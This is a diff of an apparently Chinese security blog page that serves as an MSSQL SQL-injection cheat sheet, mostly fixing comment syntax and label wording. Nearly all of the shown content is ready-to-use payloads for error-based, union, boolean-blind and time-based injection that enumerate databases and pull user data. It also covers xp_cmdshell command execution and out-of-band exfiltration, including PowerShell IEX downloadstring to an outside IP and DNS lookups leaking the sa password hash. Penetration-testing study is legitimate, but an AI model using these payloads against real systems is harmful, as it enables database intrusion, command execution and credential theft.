@@ -388,7 +388,7 @@
 </tr>
 <tr>
 <td align="left">获取数据库数量</td>
-<td align="left">当数据类型为int类型时，无法触发强制类型转换，因此需要结合convert和cast as <br><br><code>?id=1&#39; and 1&lt;char(126)%2b(select cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126) --</code>  <br><br>使用convert <br><code>?id=1&#39; and 1&lt;convert(int, char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126)) --</code> <br><br>或使用二分法 <br><code>?id=1&#39; and 1&lt;(select count(table_name) from information_schema.tables) --</code></td>
+<td align="left">当数据类型为int类型时，无法触发强制类型转换，因此需要结合convert和cast as <br><br><code>?id=1&#39; and 1&lt;char(126)%2b(select cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126) --</code>  <br><br>使用convert <br><code>?id=1&#39; and 1&lt;convert(int, char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126)) --</code> <br><br>或使用二分法 <br><code>?id=1&#39; and 1&lt;(select count(db_name) from master.dbo.sysdatabases) --</code></td>
 </tr>
 <tr>
 <td align="left">获取数据库名称</td>
@@ -403,19 +403,19 @@
 <td align="left"><code>?id=1&#39; and 1&lt;(select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)) --</code></td>
 </tr>
 <tr>
-<td align="left">获取表的字段数量</td>
+<td align="left">获取列的数量</td>
 <td align="left"><code>?id=1 and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.columns where table_name=&#39;tbname&#39;)%2bchar(126)--</code>  <br><br><code>?id=1 and 1&lt;convert(int,char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.columns where table_name=&#39;tbname&#39;)%2bchar(126)) --</code>  <br><br>二分法 <br><code>?id=1&#39; and 1&lt;(select count(column_name) from information_schema.columns where table_name = &#39;tbname&#39;) --</code></td>
 </tr>
 <tr>
-<td align="left">获取字段名称</td>
+<td align="left">获取列名</td>
 <td align="left"><code>?id=1&#39; and 1&lt;(select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;)) --</code></td>
 </tr>
 <tr>
-<td align="left">获取字段的数据数量</td>
+<td align="left">获取数据数量</td>
 <td align="left"><code>?id=1 and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from tbname..users)%2bchar(126) -- </code> <br><br><code>?id=1 and 1&lt;convert(int,char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from tbname..users)%2bchar(126)) --</code>  <br><br>二分法 <br><code>?id=1&#39; and 1&lt;(select count(username) from tbname..users) --</code></td>
 </tr>
 <tr>
-<td align="left">获取字段数据</td>
+<td align="left">获取数据值</td>
 <td align="left"><code>?id=1&#39; and 1&lt;(select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)) --</code></td>
 </tr>
 </tbody></table>
@@ -428,7 +428,7 @@
 </thead>
 <tbody><tr>
 <td align="left">判断列数</td>
-<td align="left"><code>?id=1&#39; order by 3 --</code> <br>注： mssql union select 要求前后数据类型保持一致<br>1、变参数为不存在 <br>2、用null代替空字符</td>
+<td align="left"><code>?id=1&#39; order by 3 --</code> <br>注： mssql union select 要求前后数据类型保持一致<br>1、用null代替显示位 <br>2、带个替换null，确定数据类型</td>
 </tr>
 <tr>
 <td align="left">判断显示位</td>
@@ -436,43 +436,43 @@
 </tr>
 <tr>
 <td align="left">获取数据库版本</td>
-<td align="left"><code>?id=-1&#39; union select 1,@@version,3</code></td>
+<td align="left"><code>?id=-1&#39; union select 1,@@version,3 --</code></td>
 </tr>
 <tr>
 <td align="left">获取当前数据库名称</td>
-<td align="left"><code>?id=-1&#39; union select 1,db_name(),3 –</code></td>
+<td align="left"><code>?id=-1&#39; union select 1,db_name(),3 --</code></td>
 </tr>
 <tr>
 <td align="left">获取数据库数量</td>
-<td align="left"><code>?id=-1&#39; union select 1,(select count(*) from master.dbo.sysdatabases),3 –</code></td>
+<td align="left"><code>?id=-1&#39; union select 1,(select count(*) from master.dbo.sysdatabases),3 --</code></td>
 </tr>
 <tr>
 <td align="left">获取数据库名称</td>
-<td align="left"><code>?id=-1&#39; union select 1,db_name(1),3</code> <br>db_name()表示当前数据库，db_name(1)表示第一个数据库  <br><br>或 <br><code>?id=-1&#39; union select top 1 1,name,3 from master.dbo.sysdatabases where name not in (select top 1 name from master.dbo.sysdatabases) –</code></td>
+<td align="left"><code>?id=-1&#39; union select 1,db_name(1),3 --</code> <br>db_name()表示当前数据库，db_name(1)表示第一个数据库  <br><br>或 <br><code>?id=-1&#39; union select top 1 1,name,3 from master.dbo.sysdatabases where name not in (select top 1 name from master.dbo.sysdatabases) --</code></td>
 </tr>
 <tr>
 <td align="left">获取表数量</td>
-<td align="left"><code>?id=-1&#39; union select top 1 1,count(table_name),3 from information_schema.tables –</code></td>
+<td align="left"><code>?id=-1&#39; union select top 1 1,count(table_name),3 from information_schema.tables --</code></td>
 </tr>
 <tr>
 <td align="left">获取表名称</td>
-<td align="left">显示当前数据库下的表名 <br><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables) – </code> <br><br>显示指定数据库下的表名 <br><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.tables where table_name not in (select top 1 table_name from dbname.information_schema.tables) –</code></td>
+<td align="left">显示当前数据库下的表名 <br><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables) -- </code> <br><br>显示指定数据库下的表名 <br><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.tables where table_name not in (select top 1 table_name from dbname.information_schema.tables) --</code></td>
 </tr>
 <tr>
-<td align="left">获取字段数量</td>
-<td align="left"><code>?id=-1&#39; union select top 1 1,count(column_name),3 from information_schema.columns –</code>  <br><br>获取指定表中的字段数量 <br><code>?id=-1&#39; union select top 1 1,count(column_name),3 from information_schema.columns where table_name=&#39;users&#39; –</code></td>
+<td align="left">获取列数量</td>
+<td align="left"><code>?id=-1&#39; union select top 1 1,count(column_name),3 from information_schema.columns --</code>  <br><br>获取指定表中的字段数量 <br><code>?id=-1&#39; union select top 1 1,count(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --</code></td>
 </tr>
 <tr>
-<td align="left">获取表中字段</td>
-<td align="left"><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.columns where table_name not in (select top 0 table_name from information_schema.tables) –</code><br><br>指定表获取字段 <br><code>?id=-1&#39; union select top 1 column_name,2 from information_schema.columns where table_name=’users’ and column_name not in (select top 0 column_name FROM information_schema.columns where table_name = &#39;users&#39;)) –</code></td>
+<td align="left">获取列名</td>
+<td align="left"><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.columns where table_name not in (select top 0 table_name from information_schema.tables) --</code><br><br>指定表获取字段 <br><code>?id=-1&#39; union select top 1 column_name,2 from information_schema.columns where table_name=&#39;users&#39; and column_name not in (select top 0 column_name FROM information_schema.columns where table_name = &#39;users&#39;)) --</code></td>
 </tr>
 <tr>
-<td align="left">获取字段数据数量</td>
-<td align="left"><code>?id=-1&#39; union select top 1 1,count(username),3 from test..users –</code></td>
+<td align="left">获取数据数量</td>
+<td align="left"><code>?id=-1&#39; union select top 1 1,count(username),3 from test..users --</code></td>
 </tr>
 <tr>
-<td align="left">获取字段数据</td>
-<td align="left"><code>?id=-1&#39; union select top 1 username,password from test..users where username not in (select top 0 username from test..users) –</code></td>
+<td align="left">获取数据值</td>
+<td align="left"><code>?id=-1&#39; union select top 1 username from test..users where username not in (select top 0 username from test..users) --</code></td>
 </tr>
 </tbody></table>
 <h1 id="四、Bool盲注（二分法）"><a href="#四、Bool盲注（二分法）" class="headerlink" title="四、Bool盲注（二分法）"></a>四、Bool盲注（二分法）</h1><table>
@@ -484,71 +484,71 @@
 </thead>
 <tbody><tr>
 <td align="left">判断</td>
-<td align="left"><code>?id=1&#39; and 1=1 – ?id=1&#39; and 1=0 –</code></td>
+<td align="left"><code>?id=1&#39; and 1=1 – ?id=1&#39; and 1=0 --</code></td>
 </tr>
 <tr>
 <td align="left">判断数据库版本长度</td>
-<td align="left"><code>?id=1&#39; and 1&lt;len(@@version)–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;len(@@version)--</code></td>
 </tr>
 <tr>
 <td align="left">判断数据库版本名称</td>
-<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring(@@version,1,1)) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring(@@version,1,1)) --</code></td>
 </tr>
 <tr>
 <td align="left">判断当前数据库长度</td>
-<td align="left"><code>?id=1&#39; and 1&lt;len(db_name())–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;len(db_name()) --</code></td>
 </tr>
 <tr>
 <td align="left">判断当前数据库名称</td>
-<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring(db_name(),1,1)) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring(db_name(),1,1)) --</code></td>
 </tr>
 <tr>
 <td align="left">判断数据库数量</td>
-<td align="left"><code>?id=1&#39; and 1&lt;(select count(*) from master.dbo.sysdatabases)–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;(select count(*) from master.dbo.sysdatabases) --</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断数据库长度</td>
-<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)))–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases))) --</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断数据库名称</td>
-<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)),1,1)) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)),1,1)) --</code></td>
 </tr>
 <tr>
 <td align="left">判断表数量</td>
-<td align="left"><code>?id=1&#39; and 1&lt;(select count(table_name) from information_schema.tables)–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;(select count(table_name) from information_schema.tables) --</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断表长</td>
-<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)))–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables))) --</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断表名</td>
-<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)),1,1)) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)),1,1)) --</code></td>
 </tr>
 <tr>
-<td align="left">判断字段数量</td>
-<td align="left"><code>?id=1&#39; and 1&lt;(select count(column_name) from information_schema.columns where table_name=’tbname’)–</code></td>
+<td align="left">判断列数</td>
+<td align="left"><code>?id=1&#39; and 1&lt;(select count(column_name) from information_schema.columns where table_name=&#39;tbname&#39;) --</code></td>
 </tr>
 <tr>
-<td align="left">逐个判断字段长度</td>
-<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = ‘tbname’)))–</code></td>
+<td align="left">逐个判断列的长度</td>
+<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;))) --</code></td>
 </tr>
 <tr>
-<td align="left">逐个判断字段名称</td>
-<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;)),1,1)) –</code></td>
+<td align="left">逐个判断列名</td>
+<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;)),1,1)) --</code></td>
 </tr>
 <tr>
 <td align="left">判断数据数量</td>
-<td align="left"><code>?id=1&#39; and 1&lt;(select count(username) from dbname..tbname)–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;(select count(username) from dbname..tbname) --</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断数据长度</td>
-<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)))–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users))) --</code></td>
 </tr>
 <tr>
-<td align="left">逐个判断数据名</td>
-<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)),1,1)) –</code></td>
+<td align="left">逐个判断数据值</td>
+<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)),1,1)) --</code></td>
 </tr>
 </tbody></table>
 <h1 id="五、时间延时盲注"><a href="#五、时间延时盲注" class="headerlink" title="五、时间延时盲注"></a>五、时间延时盲注</h1><table>
@@ -560,67 +560,67 @@
 </thead>
 <tbody><tr>
 <td align="left">判断数据库版本长度</td>
-<td align="left"><code>?id=1&#39; if(len(@@version)&gt;1) waitfor delay &#39;0:0:3&#39; –</code></td>
+<td align="left"><code>?id=1&#39; if(len(@@version)&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
 <td align="left">判断数据库版本名</td>
-<td align="left"><code>?id=1&#39; if(ascii(@@version)&gt;1) waitfor delay &#39;0:0:3&#39; –</code></td>
+<td align="left"><code>?id=1&#39; if(ascii(substring(@@version),1,1)&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
 <td align="left">判断当前数据库长度</td>
-<td align="left"><code>?id=1&#39; if(len(db_name())&gt;1) waitfor delay &#39;0:0:3&#39; –</code></td>
+<td align="left"><code>?id=1&#39; if(len(db_name())&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
 <td align="left">判断当前数据库名称</td>
-<td align="left"><code>?id=1&#39; if(ascii(db_name())&gt;1) waitfor delay &#39;0:0:3&#39; –</code></td>
+<td align="left"><code>?id=1&#39; if(ascii(db_name())&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
 <td align="left">判断数据库数量</td>
-<td align="left"><code>?id=1&#39; if((select count(*) from master.dbo.sysdatabases)&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if((select count(*) from master.dbo.sysdatabases)&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断数据库长度</td>
-<td align="left"><code>?id=1&#39; if(len((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if(len((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)))&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断数据库名</td>
-<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
 <td align="left">判断表数量</td>
-<td align="left"><code>?id=1&#39; if((select count(table_name) from information_schema.tables)&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if((select count(table_name) from information_schema.tables)&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断表长度</td>
-<td align="left"><code>?id=1&#39; if((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断表名</td>
-<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 <tr>
-<td align="left">判断字段数量</td>
-<td align="left"><code>?id=1&#39; if((select count(column_name) from information_schema.columns where table_name=&#39;tbname&#39;)&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left">判断列数</td>
+<td align="left"><code>?id=1&#39; if((select count(column_name) from information_schema.columns where table_name=&#39;tbname&#39;)&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 <tr>
-<td align="left">逐个判断字段长度</td>
-<td align="left"><code>?id=1&#39; if((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = ‘tbname’))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left">逐个判断列长</td>
+<td align="left"><code>?id=1&#39; if((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 <tr>
-<td align="left">逐个判断字段名</td>
-<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 table_name from information_schema.columns where column_name not in (select top 1 column_name from information_schema.columns)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left">逐个判断列名</td>
+<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 table_name from information_schema.columns where column_name not in (select top 1 column_name from information_schema.columns)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 <tr>
 <td align="left">判断数据数量</td>
-<td align="left"><code>?id=1&#39; if((select count(username) from tbname..users)&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if((select count(username) from tbname..users)&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断数据长度</td>
-<td align="left"><code>?id=1&#39; if(len((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if(len((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)))&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
-<td align="left">逐个判断数据名</td>
-<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left">逐个判断数据值</td>
+<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 </tbody></table>
 <h1 id="六、命令执行"><a href="#六、命令执行" class="headerlink" title="六、命令执行"></a>六、命令执行</h1><p>xp_cmdshell 默认关闭状态/管理员才可以开启</p>
@@ -634,7 +634,7 @@
 
 <p><strong>用sql注入，来获取命令执行结果</strong></p>
 <p>1、创建一个表，再把命令执行的结果，写入到表中。</p>
-<pre class="highlight"><span class="line">?id=1&#x27;; create table sqldata(result VARCHAR(8000)); –</span><br></pre>
+<pre class="highlight"><span class="line">`?id=1&#x27;; create table sqldata(result VARCHAR(8000)); --`</span><br></pre>
 
 <p>2、执行命令，并且把结果写入表中</p>
 <table>
@@ -646,11 +646,11 @@
 </thead>
 <tbody><tr>
 <td align="left">直接写入</td>
-<td align="left"><code>?id=1&#39;;INSERT INTO sqldata (result) EXEC master..xp_cmdshell &#39;net user&#39;–</code></td>
+<td align="left"><code>?id=1&#39;;INSERT INTO sqldata (result) EXEC master..xp_cmdshell &#39;net user&#39;--</code></td>
 </tr>
 <tr>
 <td align="left">转换一下</td>
-<td align="left"><code>?id=1&#39;;DECLARE @adqa VARCHAR(8000);SET @adqa=0x6970636F6E666967202F616C6C;INSERT INTO sqldata(result) EXEC master..xp_cmdshell @adqa–</code></td>
+<td align="left"><code>?id=1&#39;;DECLARE @adqa VARCHAR(8000);SET @adqa=0x6970636F6E666967202F616C6C;INSERT INTO sqldata(result) EXEC master..xp_cmdshell @adqa--</code></td>
 </tr>
 </tbody></table>
 <h1 id="七、DNS外带"><a href="#七、DNS外带" class="headerlink" title="七、DNS外带"></a>七、DNS外带</h1><table>
@@ -662,19 +662,19 @@
 </thead>
 <tbody><tr>
 <td align="left">字符型外带–指定ip端口</td>
-<td align="left"><code>?id=1;DECLARE @a varchar(8000);SET @a=(SELECT TOP 1 master.dbo.fn_varbintohexstr(CONVERT(varbinary,name)) from Master.dbo.SysDatabases);exec(&#39;master..xp_cmdshell &quot;powershell IEX (new-object net.webclient).downloadstring(&quot;http://172.16.12.187:9008/?data=&#39;%2b @a %2b&#39; &quot;)&quot;&#39; ) –</code></td>
+<td align="left"><code>?id=1;DECLARE @a varchar(8000);SET @a=(SELECT TOP 1 master.dbo.fn_varbintohexstr(CONVERT(varbinary,name)) from Master.dbo.SysDatabases);exec(&#39;master..xp_cmdshell &quot;powershell IEX (new-object net.webclient).downloadstring(&quot;http://172.16.12.187:9008/?data=&#39;%2b @a %2b&#39; &quot;)&quot;&#39; ) --</code></td>
 </tr>
 <tr>
 <td align="left">数字型外带–指定ip端口</td>
-<td align="left"><code>?id=1;DECLARE @a VARCHAR(8000);SET @a=(SELECT TOP 1 substring(@@version,1,35));exec(&#39;master..xp_cmdshell &quot;powershell IEX (new-object net.webclient).downloadstring(&quot;http://172.16.12.187:9008/?data=&#39;%2b @a %2b&#39; &quot;)&quot;&#39; ) –</code></td>
+<td align="left"><code>?id=1;DECLARE @a VARCHAR(8000);SET @a=(SELECT TOP 1 substring(@@version,1,35));exec(&#39;master..xp_cmdshell &quot;powershell IEX (new-object net.webclient).downloadstring(&quot;http://172.16.12.187:9008/?data=&#39;%2b @a %2b&#39; &quot;)&quot;&#39; ) --</code></td>
 </tr>
 <tr>
 <td align="left">字符型外带–dnslog平台***</td>
-<td align="left"><code>?id=1&#39;;declare @a varchar(1024);set @a=db_name();exec(&#39;master..xp_dirtree &quot;//&#39;%2B @a %2B&#39;.dnslog.io&quot;&#39;)–</code></td>
+<td align="left"><code>?id=1&#39;;declare @a varchar(1024);set @a=db_name();exec(&#39;master..xp_dirtree &quot;//&#39;%2B @a %2B&#39;.dnslog.io&quot;&#39;)--</code></td>
 </tr>
 <tr>
 <td align="left">数字型外带–dnslog平台</td>
-<td align="left"><code>?id=1; declare @a varchar(1024);set @a=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name=&#39;sa&#39;); exec(&#39;master..xp_cmdshell &quot;ping -n 2&#39; %2b @a %2b &#39;.dnslog.com&#39; &quot;)–</code></td>
+<td align="left"><code>?id=1; declare @a varchar(1024);set @a=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name=&#39;sa&#39;); exec(&#39;master..xp_cmdshell &quot;ping -n 2&#39; %2b @a %2b &#39;.dnslog.com&#39; &quot;)--</code></td>
 </tr>
 </tbody></table>
 <p>http外带需要监听http端口（python -m http.server 9008）</p>
@@ -873,17 +873,17 @@
         </div>
       </a>
     
-      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
-        <div class="categories-list-item">
-          环境搭建
-          <span class="categories-list-item-badge">7</span>
-        </div>
-      </a>
-    
       <a href="/categories/Linux/">
         <div class="categories-list-item">
           Linux
           <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <div class="categories-list-item">
+          环境搭建
+          <span class="categories-list-item-badge">7</span>
         </div>
       </a>
     
@@ -923,99 +923,99 @@
   <div class="tags-list">
     
       <a 
-        href="/tags/Access/" 
-        title="Access">
-        <div class="tags-list-item">Access</div>
-      </a>
-    
-      <a 
-        href="/tags/BurpSuite%E4%BB%A3%E7%90%86/" 
-        title="BurpSuite代理">
-        <div class="tags-list-item">BurpSuite代理</div>
-      </a>
-    
-      <a 
-        href="/tags/%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/" 
-        title="绕过Token爆破">
-        <div class="tags-list-item">绕过Token爆破</div>
-      </a>
-    
-      <a 
-        href="/tags/CSRF/" 
-        title="CSRF">
-        <div class="tags-list-item">CSRF</div>
-      </a>
-    
-      <a 
-        href="/tags/HTML/" 
-        title="HTML">
-        <div class="tags-list-item">HTML</div>
-      </a>
-    
-      <a 
-        href="/tags/CSS/" 
-        title="CSS">
-        <div class="tags-list-item">CSS</div>
-      </a>
-    
-      <a 
-        href="/tags/HTTP/" 
-        title="HTTP">
-        <div class="tags-list-item">HTTP</div>
-      </a>
-    
-      <a 
-        href="/tags/JavaScript/" 
-        title="JavaScript">
-        <div class="tags-list-item">JavaScript</div>
-      </a>
-    
-      <a 
-        href="/tags/JBoss/" 
-        title="JBoss">
-        <div class="tags-list-item">JBoss</div>
-      </a>
-    
-      <a 
-        href="/tags/Java/" 
-        title="Java">
-        <div class="tags-list-item">Java</div>
-      </a>
-    
-      <a 
-        href="/tags/MS17-010/" 
-        title="MS17-010">
-        <div class="tags-list-item">MS17-010</div>
-      </a>
-    
-      <a 
         href="/tags/%E9%9A%8F%E8%AE%B0/" 
         title="随记">
         <div class="tags-list-item">随记</div>
       </a>
     
       <a 
-        href="/tags/MSSQL/" 
-        title="MSSQL">
-        <div class="tags-list-item">MSSQL</div>
+        href="/tags/Redis/" 
+        title="Redis">
+        <div class="tags-list-item">Redis</div>
       </a>
     
       <a 
-        href="/tags/Nosql/" 
-        title="Nosql">
-        <div class="tags-list-item">Nosql</div>
+        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
+        title="逻辑漏洞">
+        <div class="tags-list-item">逻辑漏洞</div>
       </a>
     
       <a 
-        href="/tags/mysql/" 
-        title="mysql">
-        <div class="tags-list-item">mysql</div>
+        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
+        title="网络协议">
+        <div class="tags-list-item">网络协议</div>
       </a>
     
       <a 
-        href="/tags/Oracle/" 
-        title="Oracle">
-        <div class="tags-list-item">Oracle</div>
+        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
+        title="文件包含">
+        <div class="tags-list-item">文件包含</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/" 
+        title="综合靶场">
+        <div class="tags-list-item">综合靶场</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8D%9A%E5%AE%A2/" 
+        title="博客">
+        <div class="tags-list-item">博客</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
+        title="直播推流">
+        <div class="tags-list-item">直播推流</div>
+      </a>
+    
+      <a 
+        href="/tags/Nginx/" 
+        title="Nginx">
+        <div class="tags-list-item">Nginx</div>
+      </a>
+    
+      <a 
+        href="/tags/Apache/" 
+        title="Apache">
+        <div class="tags-list-item">Apache</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
+        title="命令执行">
+        <div class="tags-list-item">命令执行</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
+        title="反弹shell">
+        <div class="tags-list-item">反弹shell</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
+      </a>
+    
+      <a 
+        href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" 
+        title="信息收集">
+        <div class="tags-list-item">信息收集</div>
+      </a>
+    
+      <a 
+        href="/tags/DVWA/" 
+        title="DVWA">
+        <div class="tags-list-item">DVWA</div>
       </a>
     
   </div>
